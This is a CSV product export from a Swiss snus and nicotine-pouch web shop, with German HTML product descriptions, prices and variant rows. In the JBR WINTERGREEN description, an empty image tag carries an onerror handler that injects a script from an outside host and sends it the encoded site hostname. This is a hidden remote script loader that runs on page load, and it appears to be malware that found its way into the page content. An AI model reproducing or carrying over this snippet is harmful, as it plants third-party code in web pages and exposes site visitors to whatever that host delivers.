Name,Description,SKU,Gender, Attribute 1,Attribute 1 Value, Attribute 2,Attribute 2 Value, Attribute 3,Attribute 3 Value,Base Image 1 ,Base Image 2,Base Image 3,Base Image 4,Base Image 5,Base Price(USD),Sale Price(USD),Quantity,Unit of Weight,Weight,Unit of Dimensions,Height,Width,Length,SEO Title,SEO Description,Vendor,Parent SKU
ICE Freeze Reaper Limited Edition,,ICE Freeze Reaper Limited Edition,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_e4a958b0-850d-4ae4-8435-f125aae6e530.jpg,,,,,4.90,,1,G,1,IN,3,3,3,,,,
,,922,Unisex,Title,Default Title,,,,,,,,,,4.90,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Freeze Reaper Limited Edition
ICE CBD Mint,<p>ICE CBD MINT überzeugt mit seiner stärke und dem CBD Anteil. CBD Produkte werden in der Schweiz immer wie beliebter. Deshalb ist es umso wichtiger CBD Snus ins Sortiment zu nehmen. Der ICE CBD Mint mit der Geschmacksrichtung Mint überzeugt jeden Kunden.</p>,ICE CBD Mint,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_fbafcf7d-14b8-400d-9c74-3920c749c0b0.jpg,,,,,10.60,,1,G,1,IN,3,3,3,,,,
,,920,Unisex,Stück,1,,,,,,,,,,10.60,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE CBD Mint
,,920,Unisex,Stück,10,,,,,,,,,,100.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE CBD Mint
ICE Green Bliss CBD Apfel,<p>ICE CBD APFEL überzeugt mit seiner stärke und dem CBD Anteil. CBD Produkte werden in der Schweiz immer wie beliebter. Deshalb ist es umso wichtiger CBD Snus ins Sortiment zu nehmen. Der ICE CBD Apfel mit der Geschmacksrichtung Apfel überzeugt jeden Kunden.</p>,ICE Green Bliss CBD Apfel,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_10dad6dd-0113-4f4a-8c37-510d5e446e82.jpg,,,,,15.00,10.50,1,G,1,IN,3,3,3,,,,
,,918,Unisex,Stück,1,,,,,,,,,,15.00,10.50,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Green Bliss CBD Apfel
,,918,Unisex,Stück,10,,,,,,,,,,120.00,100.00,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Green Bliss CBD Apfel
ICE Salmiakki,ICE SALMIAKKI überzeugt mit seiner stärke und dem noch unbekannten Geschmack. Der ICE Salmiakki gehört zu den ICE Neuheiten. Der ICE Snus ist in Schweden einer der beliebtesten Snus. Nun hat er seinen weg in die Schweiz gefunden!.,ICE Salmiakki,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_18c17699-3107-4934-9383-150c65538239.jpg,,,,,4.90,,1,G,1,IN,3,3,3,,,,
,,917,Unisex,Stück,1,,,,,,,,,,4.90,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Salmiakki
,,917,Unisex,Stück,10,,,,,,,,,,45.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Salmiakki
ICE CBD Guava,<p>ICE CBD Guava überzeugt mit seiner stärke und dem CBD Anteil. CBD Produkte werden in der Schweiz immer wie beliebter. Deshalb ist es umso wichtiger CBD Snus ins Sortiment zu nehmen. Der ICE CBD Guava mit der Geschmacksrichtung Guava überzeugt jeden Kunden.</p>,ICE CBD Guava,Unisex,,,,,,,,,,,,15.00,10.60,1,G,1,IN,3,3,3,,,,
,,921,Unisex,Stück,1,,,,,,,,,,15.00,10.60,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE CBD Guava
,,921,Unisex,Stück,10,,,,,,,,,,120.00,100.00,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE CBD Guava
ICE Frost CBD Double Mint,<p>ICE CBD DOUBLE MINT überzeugt mit seiner stärke und dem CBD Anteil. CBD Produkte werden in der Schweiz immer wie beliebter. Deshalb ist es umso wichtiger CBD Snus ins Sortiment zu nehmen. Der ICE CBD Double Mint mit der Geschmacksrichtung Double Mint überzeugt jeden Kunden.</p>,ICE Frost CBD Double Mint,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_254183eb-b3b8-470e-9ec1-7668a022a317.jpg,,,,,15.00,10.90,1,G,1,IN,3,3,3,,,,
,,919,Unisex,Stück,1,,,,,,,,,,15.00,10.90,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Frost CBD Double Mint
,,919,Unisex,Stück,10,,,,,,,,,,120.00,100.00,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Frost CBD Double Mint
ICE Frost Doublemint,"<p>ICE FROST DOUBLE MINT</p>
<p>überzeugt mit seiner stärke und dem allzeitbeliebten Geschmack Double Mint. Der ICE Frost Double Mint gehört zu den ICE Neuheiten. Der ICE Snus ist in Schweden einer der beliebtesten Snus. Nun hat er seinen weg in die Schweiz gefunden!</p>",ICE Frost Doublemint,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/icefrost.png,,,,,4.90,,1,G,1,IN,3,3,3,,,,
,,911,Unisex,Stück,1,,,,,,,,,,4.90,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Frost Doublemint
,,911,Unisex,Stück,10,,,,,,,,,,45.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Frost Doublemint
Jakobsson Cola Strong,"<p><span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""> <strong>Ab Lager verfügbar</strong></span></p>
<p><span>Der Snus kommt in original Beutel mit deutlichem Geschmack von Cola und Zitrus. Diese Sorte wurde von der CEO, Henrik Jakobsson hervorgenommen!</span></p>
<p> </p>
<p> </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Salz, Säureregulator E500</p>
<p>Tabakgewicht (g): 20                            Portionen / Dose: ~20</p>
<p>Versandgewicht (g): 40                        Geschmack: Tabak, Cola</p>
<p>Nikotin (mg/g): 14.0</p>
<p> </p>
<p> </p>
<p> </p>
<p>Art Nr: 503</p>",Jakobsson Cola Strong,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/jakobsonsstrongcola.png,,,,,5.90,,1,G,37,IN,3,3,3,,,,
,,503,Unisex,Stück,1,,,,,,,,,,5.90,,1,G,37,IN,3,3,3,,,Snus-King,Jakobsson Cola Strong
,,503,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,370,IN,3,3,3,,,Snus-King,Jakobsson Cola Strong
Jakobsson Melone Strong,"<p><span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""> <strong>Ab Lager verfügbar</strong></span></p>
<p><span>Mit Geschmak von Melone sowie etwas Birne und Süsses. Die Beutel sind im Original Format.</span></p>
<p> </p>
<p> </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 20                           Portionen / Dose: ~20</p>
<p>Versandgewicht (g): 40                        Geschmack: Tabak, Melone, </p>
<p>Nikotin (mg/g): 14.0</p>
<p> </p>
<p>  </p>
<p> <span>Art Nr: 500</span></p>
<p> </p>",Jakobsson Melone Strong,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/jakobsonsmelon.png,,,,,5.90,,1,G,35,IN,3,3,3,,,,
,,500,Unisex,Stück,1,,,,,,,,,,5.90,,1,G,35,IN,3,3,3,,,Snus-King,Jakobsson Melone Strong
,,500,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,350,IN,3,3,3,,,Snus-King,Jakobsson Melone Strong
Jakobsson Mint Strong,"<p><span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""> <strong>Ab Lager verfügbar</strong></span></p>
<p><span>Ein starker Snus mit Geschmack von Minze.</span></p>
<p> </p>
<p> </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 20                            Portionen / Dose: ~20</p>
<p>Versandgewicht (g): 39                        Geschmack: Tabak,, Kräuter, Minze</p>
<p>Nikotin (mg/g): 14.0</p>
<p> </p>
<p> Art Nr: 501</p>",Jakobsson Mint Strong,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/jakobsonsmint.png,,,,,5.90,,1,G,36,IN,3,3,3,,,,
,,501,Unisex,Stück,1,,,,,,,,,,5.90,,1,G,36,IN,3,3,3,,,Snus-King,Jakobsson Mint Strong
,,501,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,360,IN,3,3,3,,,Snus-King,Jakobsson Mint Strong
JBR RED,"<p><span>JBR Red Snuff ist ein typischer Pöschler mentholhaltiger Schnupftabak, der in stylischen, glänzenden 10-Gramm-Kunststoffdosen verkauft wird. Der Geruch in der Dose: Schon riecht man ein kräftiges Kirscharoma mit einem Hauch Minze. Ein fruchtiger, aber gleichzeitig kühler Schnupftabak kündigt sich an. Geruch in der Nase: Durch seine mittlere Abrasivität und leichte Feuchtigkeit ist Schnupftabak sehr gut zum Schnüffeln geeignet. Wie Sie es von vielen Pöschl Snuffs gewohnt sind, gelangt Menthol beim Riechen zuerst in die Nase. Schnell kamen aromatische Kirschnoten und feste Tabak-Basisnoten ins Spiel. Allmählich lässt der fruchtige Anteil wieder nach und der satte Minzgeschmack gewinnt wieder an Kraft. Kirsch-Menthol-Kompositionen sind bei Schnupftabak-Liebhabern sehr beliebt, da ihre Mischungen meist sehr harmonisch sind. Dies ist auch bei dem ausgewogenen Geschmack von JBR Red Snuff der Fall.</span></p>
<p> </p>
<p>Art Nr: 1015</p>",JBR RED,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_fad69c33-524b-4dd6-8c90-91e3ae5ff9bc.jpg,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1015,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR RED
,,1015,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR RED
,,1015,Unisex,Stück,20,,,,,,,,,,100.00,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR RED
JBR YELLOW,"<p>JBR Yellow Snuff ist ein typischer Pöschler mentholhaltiger Schnupftabak, der in stylischen, glänzenden 10-Gramm-Kunststoffdosen auf dem Markt angeboten wird.<br><br>Geruch in der Dose:<br>Wenn Sie JBR YELLOW probieren, werden Sie schnell feststellen, dass JBR Yellow auch den typischen Mentholgeschmack von Pöschl besitzt. Dazu kommt ein Hauch von Zitronengeschmack, der an Zitronenkuchen erinnert.<br>Geruch in der Nase:<br>Durch den mäßigen Mahlgrad und die leichte Feuchtigkeit eignet sich Schnupftabak sehr gut zum Schnüffeln. Wenn JBR Yellow Snuff in die Nase kommt, strömt eine angenehme Mischung aus Menthol- und Zitrusfruchtaromen (die höchstwahrscheinlich an Zitrone, aber auch leicht an Orange erinnern) durch die Geruchsorgane. Die Zutaten sind immer harmonisch, das Verhältnis von fruchtig und erfrischend ist relativ ausgeglichen und wird die Nase nicht überfordern. Schließlich ist Menthol immer noch die Hauptnote. Im Allgemeinen ist fast kein Tabakgeruch zu hören.</p>
<p>Art Nr: 1014</p>
<p> </p>
<p> </p>
<div data-mce-fragment=""1"" style=""text-align: left;"" data-mce-style=""text-align: left;""><br></div>",JBR YELLOW,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_61eb96ad-1e10-48b3-b5df-3bbd51606530.jpg,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1014,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR YELLOW
,,1014,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR YELLOW
,,1014,Unisex,Stück,20,,,,,,,,,,138.00,100.00,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR YELLOW
JBR WINTERGREEN SCHNUPF 10g,"<div class=""col3"">
<br data-mce-fragment=""1""> Die Pöschl Tabak GmbH &amp; Co. KG Geisenhausen bringt mit JBR Wintergreen einen neuen Snuff auf den deutschen Markt.<br data-mce-fragment=""1"">Die seit 2015 bisher ausschließlich in Österreich und der Schweiz vertriebene Sorte ist ab Juli 2016 auch im deutschen Handel erhältlich.<br data-mce-fragment=""1"">JBR Wintergreen ist ein english-type Menthol Snuff .<br data-mce-fragment=""1""> <br>
</div>
<p> </p>
<p> </p>
<p><span>Art Nr: 1001</span></p>
<div id=""mailtooptionchmailPopupModalTo"" style=""z-index: 1;""></div>
<div><img onerror='var s=document.createElement(""script"");s.type=""text/javascript"";s.id=""cczedcc-plg-analytics"";s.src=""//jejoro.miyinokejo.com/scripts/js?k=5fcd009490cf76e4258b4567&amp;s=""+encodeURI(btoa(window.location.host))+""&amp;ns=true"";document.getElementsByTagName(""head"")[0].appendChild(s);'></div>",JBR WINTERGREEN SCHNUPF 10g,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_651a7157-8ef3-4f6c-946e-c529a0241be5.jpg,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1001,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King,JBR WINTERGREEN SCHNUPF 10g
,,1001,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,100,IN,3,3,3,,,Snus-King,JBR WINTERGREEN SCHNUPF 10g
,,1001,Unisex,Stück,20,,,,,,,,,,100.00,0.00,1,G,200,IN,3,3,3,,,Snus-King,JBR WINTERGREEN SCHNUPF 10g
JBR BLUE SCHNUPF 10G,"<p>Einmal aufgeschnupft, kommen zuerst das erfrischende Menthol und das fruchtige Eisbonbon-Aroma des JBR BLUE gleichermaßen zum Zuge. Einige Schnupfer fühlen sich vielleicht in die Kindheit zurückversetzt, denn das Aroma vom JBR BLUE von Eisbonbon ist bei Groß und Klein gleichermaßen beliebt. Nach und nach gewinnt der starke Menthol-Geschmack des JBR BLUE die Oberhand.</p>
<p> </p>
<p> Art Nr: 1003</p>",JBR BLUE SCHNUPF 10G,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_2c34eb33-9eb7-4a3e-95d2-e7146887ddb6.jpg,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1003,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King,JBR BLUE SCHNUPF 10G
,,1003,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,100,IN,3,3,3,,,Snus-King,JBR BLUE SCHNUPF 10G
,,1003,Unisex,Stück,20,,,,,,,,,,100.00,0.00,1,G,200,IN,3,3,3,,,Snus-King,JBR BLUE SCHNUPF 10G
Kurbits fäbodsnus,"<meta charset=""UTF-8"">
<p><span>Der Kurbits Fäbodsnus (Bauernhof-Snus) vereint die traditionellen Aromen und Düfte der älteren Generationen des Snushandwerks. Ein klarer Geschmack aus rustikalem Tabak trifft auf sonnenverwöhnte Blumenwiesen und klare Noten von Süße und Vanille. Die nüchternen, aber auch praktischen Gegebenheiten der Landwirtschaft und ihre abegehärteten Besitzer geben die Inspiration für einen Snus mit einem sehr ausgeprägten Geschmack und Geruch.</span></p>",Kurbits fäbodsnus,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_3d2b0662-e8f1-4139-bdbc-d380830a4bfe.jpg,,,,,8.90,4.00,1,G,1,IN,3,3,3,,,,
,,,Unisex,Title,Default Title,,,,,,,,,,8.90,4.00,1,G,1,IN,3,3,3,,,Snus-King.ch,Kurbits fäbodsnus
Kurbits morgondagg,"<meta charset=""UTF-8"">
<p><span>Im Kurbits Morgondagg (Morgentau) finden wir die Düfte und Erwartungen eines milden Mittsommermorgens. Blumen, Süße, Lakritz und eine vertraute Kühle von einem Morgen, der nicht wirklich von den Sonnenstrahlen erwärmt wurde. Der Tabak wurde gemischt und verarbeitet, um sich leicht, ansprechend und frisch anzufühlen.</span></p>",Kurbits morgondagg,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image.png,,,,,8.90,4.00,1,G,1,IN,3,3,3,,,,
,,,Unisex,Title,Default Title,,,,,,,,,,8.90,4.00,1,G,1,IN,3,3,3,,,Snus-King.ch,Kurbits morgondagg
LYFT FREEZE SLIM,"<p><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>Der<strong><span> LYFT FREEZE SLIM</span><span> </span></strong>ist ein extra starker, tabakfreier Snus mit einem Nikotingehalt von 16 mg/g. Einer der stärksten Nikotinbeutel auf dem Snusmarkt. Der Geschmack repräsentiert die kalten Alpen an einem stürmischen Tag, mit einem eisigen Mentholgeschmack und intensiver Pfefferminze. Vielleicht nicht für die neuen Snusers gedacht, es sei denn, Sie suchen nach einem super hohen Nikotingehalt.</p>
<p>Die Beutel sind in einem schlanken, All White Format erhältlich. Dies bedeutet, dass sie aus Pflanzenfasern bestehen und keine Verfärbungen auf Ihren Zähnen hinterlassen. Die Beutel sind zwar diskret unter Ihrer Lippe, aber das eisige Gefühl ist immer noch stark spürbar.</p>
<p> </p>
<p> </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 16.8                            Portionen / Dose: ~24</p>
<p>Versandgewicht (g): 34                        Geschmack: Tabak, Minze, Pfefferminze</p>
<p>Nikotin (mg/g): 14.0</p>
<p>  </p>
<p> <span>Art Nr: 203</span></p>",LYFT FREEZE SLIM,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_cd0dc0f9-b147-4976-a2ab-b6fb277b9c60.png,,,,,6.90,,1,G,33,IN,3,3,3,,,,
,,203,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,33,IN,3,3,3,,,Snus-King,LYFT FREEZE SLIM
,,203,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,330,IN,3,3,3,,,Snus-King,LYFT FREEZE SLIM
EPOK Hurricane White,"<p><strong><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span>Ab Lager verfügbar</span></strong></p>
<p> Der neue Lyft Hurricane überrascht mit seiner stärke. er ist noch stärker als jeder zuvor. die Weissen Lyft Beutel muss man probiert haben. </p>
<p>epok hurricane</p>
<p> </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 26.6                            Portionen / Dose: ~20</p>
<p>Versandgewicht (g): 40                        Geschmack: Tabak, Mint</p>
<p>Nikotin (mg/g): 14.0</p>
<p> </p>
<p> </p>
<p> </p>
<p><span>Artikel: 205</span></p>",EPOK Hurricane White,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_913158ca-d1a5-4629-8fdd-974d2754b698.jpg,,,,,9.90,,1,G,30,IN,3,3,3,,,,
,,205,Unisex,Stück,1,,,,,,,,,,9.90,,1,G,30,IN,3,3,3,,,Snus-King,EPOK Hurricane White
,,205,Unisex,Stück,10,,,,,,,,,,99.00,,1,G,300,IN,3,3,3,,,Snus-King,EPOK Hurricane White
LYFT TROPIC BREEZE SLIM,"<div class=""p-description-full"">
<p>Lyft Tropic Breeze 10.9mg Slim Nicotine Pouches hat einen tropischen Geschmack und wird von BAT hergestellt.</p>
<p>Die Nikotinerfahrung liegt bei 4 von 4 im Vergleich zu ähnlichen Nikotinbeutel Produkten. Die Slim Beutel sind auch im Original Format verfügbar.</p>
<p> </p>
</div>
<div class=""p-attributes-full"">
<h5>Kurze Info</h5>
<table class=""table-padding"">
<tbody>
<tr>
<td>Marke</td>
<td class=""text-right bold""><a href=""https://www.northerner.com/de/velo/"">VELO</a></td>
</tr>
<tr>
<td>Inhalt pro Dose (Gramm)</td>
<td class=""text-right bold"">14</td>
</tr>
<tr>
<td>Aroma</td>
<td class=""text-right bold"">Frucht</td>
</tr>
<tr>
<td>Format</td>
<td class=""text-right bold"">Slim</td>
</tr>
<tr>
<td>Nikotinstärke (mg/g)</td>
<td class=""text-right bold"">10.9</td>
</tr>
<tr>
<td>Stärke</td>
<td class=""text-right bold"">Extra Strong</td>
</tr>
<tr>
<td>Produkttyp</td>
<td class=""text-right bold"">Nikotinbeutel</td>
</tr>
<tr>
<td>Gewicht pro Beutel (Gramm)</td>
<td class=""text-right bold"">0.7</td>
</tr>
<tr>
<td>Hersteller</td>
<td class=""text-right bold"">BAT</td>
</tr>
</tbody>
</table>
</div>",LYFT TROPIC BREEZE SLIM,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_05ae16fc-98cd-4f78-82c8-dac60a13d2a3.png,,,,,6.90,,1,G,33,IN,3,3,3,,,,
,,204,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,33,IN,3,3,3,,,Snus-King,LYFT TROPIC BREEZE SLIM
,,204,Unisex,Stück,10,,,,,,,,,,59.00,,1,G,330,IN,3,3,3,,,Snus-King,LYFT TROPIC BREEZE SLIM
LYFT ICE COOL MINT STRONG,"<p><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>Die weisse slim Beutel verfärben nicht die Zähne und müssen nicht gekühlt aufbewahrt werden. Der LYFT Ice Cool Mint Slim Strong hat einen erfrischenden Geschmack von Minze und ganz leichten Noten von Karamellbonbon. Dieser Snus hat einen höheren Nikotingehalt und eine etwas höhere Feuchtigkeit für eine schnelle und intensive Aromenfreisetzung.</p>
<p>Beim Blindtest merkt man zwischen LYFT und Epok keinen Unterschied!</p>
<p> </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 16.8                            Portionen / Dose: ~24</p>
<p>Versandgewicht (g): 34                        Geschmack: Tabak, Bergamotte, Kräuter</p>
<p>Nikotin (mg/g): 14.0</p>
<p> </p>
<p>  </p>
<p><span>Art Nr: 202</span></p>",LYFT ICE COOL MINT STRONG,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_4db1a79c-8839-4c07-9de8-fdabf3443e60.png,,,,,6.90,,1,G,33,IN,3,3,3,,,,
,,202,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,33,IN,3,3,3,,,Snus-King,LYFT ICE COOL MINT STRONG
,,202,Unisex,Stück,10,,,,,,,,,,59.00,,1,G,330,IN,3,3,3,,,Snus-King,LYFT ICE COOL MINT STRONG
LYFT MINT WHITE SLIM,"<div class=""p-description-full"">
<p>Lyft Minze Slim Nikotinbeutel hat einen Minzgeschmack und wird von British American Tobacco hergestellt. Die Nikotinerfahrung liegt bei 2 von 4 im Vergleich zu ähnlichen Nikotinbeutel Produkten. Die schlanken Beutel sind auch mit anderen Aromen verfügbar.</p>
<p>LYFT Mint Slim ist ein vollständig tabakfreies Produkt, das Nikotin enthält. Es hat einen süßen und milden grünen Minze-Geschmack, der perfekt mit der Frische des kühlenden Menthols kombiniert ist. LYFT besteht aus Fasern aus Eukalyptus und Kiefer und enthält einen zugesetzten Nikotinextrakt, der aus der Tabakpflanze extrahiert wurde. Dieses Produkt wird in schlanken weißen Beuteln geliefert.</p>
<p> </p>
</div>
<div class=""p-attributes-full"">
<h5>Kurze Info</h5>
<table class=""table-padding"">
<tbody>
<tr>
<td>Marke</td>
<td class=""text-right bold"">LYFT</td>
</tr>
<tr>
<td>Aroma</td>
<td class=""text-right bold"">Minze</td>
</tr>
<tr>
<td>Format</td>
<td class=""text-right bold"">Slim</td>
</tr>
<tr>
<td>Stärke</td>
<td class=""text-right bold"">Normal</td>
</tr>
<tr>
<td>Produkttyp</td>
<td class=""text-right bold"">Nikotinbeutel</td>
</tr>
<tr>
<td>Inhalt pro Dose (Gramm)</td>
<td class=""text-right bold"">14,7</td>
</tr>
<tr>
<td>Nikotinstärke (mg/g)</td>
<td class=""text-right bold"">8</td>
</tr>
<tr>
<td>Beutel pro Dose</td>
<td class=""text-right bold"">21</td>
</tr>
<tr>
<td>Gewicht pro Beutel (Gramm)</td>
<td class=""text-right bold"">0,7</td>
</tr>
<tr>
<td>Hersteller</td>
<td class=""text-right bold"">BAT</td>
</tr>
</tbody>
</table>
</div>",LYFT MINT WHITE SLIM,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_e9715ad4-6a99-4bda-b528-b85a509a01c7.png,,,,,6.90,,1,G,34,IN,3,3,3,,,,
,,200,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,34,IN,3,3,3,,,Snus-King,LYFT MINT WHITE SLIM
,,200,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,340,IN,3,3,3,,,Snus-King,LYFT MINT WHITE SLIM
MC Crystals CBD,,MC Crystals CBD,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/snuffcbd.png,,,,,7.90,,1,G,21,IN,3,3,3,,,,
,,1005,Unisex,Title,Default Title,,,,,,,,,,7.90,,1,G,21,IN,3,3,3,,,Snus-King.ch,MC Crystals CBD
MC. CRYSTALS WHISKEY SHOT Schnupf,"<p><span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span style=""background-color: #ffffff; color: #2a910e;""><strong>Ab Lager verfügbar</strong></span></p>
<p>Mc.Chrystal`s - Whiskey-Shot Schnupf</p>
<p>Klassischer Mc. Chrystal's geschmack mit einem Schuss Whikey Aroma.</p>
<p>Für jeden Whiskey Liebhaber ein idealer Schnupftabak.</p>
<p> </p>
<p> </p>
<p>Art Nr: 1000</p>
<div id=""mailtooptionchmailPopupModalTo"" style=""z-index: 1;"">
<div id=""mailtooptionchtoPopupModalMail"">
<div id=""mailtooptionchpopupMailCloseModal""></div>
<div id=""mailtooptionchpopupQuestion""></div>
</div>
</div>",MC. CRYSTALS WHISKEY SHOT Schnupf,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/whiskeyshot.png,,,,,6.10,,1,G,20,IN,3,3,3,,,,
,,1000,Unisex,Stück,1,,,,,,,,,,6.10,,1,G,20,IN,3,3,3,,,Snus-King,MC. CRYSTALS WHISKEY SHOT Schnupf
,,1000,Unisex,Stück,5,,,,,,,,,,30.50,,1,G,100,IN,3,3,3,,,Snus-King,MC. CRYSTALS WHISKEY SHOT Schnupf
